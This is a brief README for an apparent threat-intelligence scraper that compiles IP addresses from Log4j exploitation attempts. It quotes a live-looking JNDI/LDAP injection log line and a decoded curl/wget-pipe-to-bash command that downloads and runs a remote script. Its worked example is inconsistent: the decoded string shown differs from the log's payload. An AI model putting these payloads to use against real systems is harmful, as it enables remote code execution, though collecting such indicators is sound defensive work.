# Log4j-ips

Scraping a few sources to create one huge list.  
Also decoding base64 payloads to find new ips.  
Added RFC1918 filtration

So from a log like this:
```
:access.log:45.137.21.9 - - [11/Dec/2021:03:22:00 +0100] "POST / HTTP/1.1" 200 50 0 "-" "${jndi:ldap://45.137.21.9:1389/Basic/Command/Base64/d2dldCAtcSAtTy0gaHR0cDovLzYyLjIxMC4xMzAuMjUwL2xoLnNofGJhc2g=}"
```

My Script/Scraper will add:  
45.137.21.9  
92.242.40.21  

The 92.242.40.21 IP Comes from decoding the Base64 payload.  

```
echo "KGN1cmwgLXMgOTIuMjQyLjQwLjIxL2xoLnNofHx3Z2V0IC1xIC1PLSA5Mi4yNDIuNDAuMjEvbGguc2gpfGJhc2g=" | base64 -d
(curl -s 92.242.40.21/lh.sh||wget -q -O- 92.242.40.21/lh.sh)|bash

```
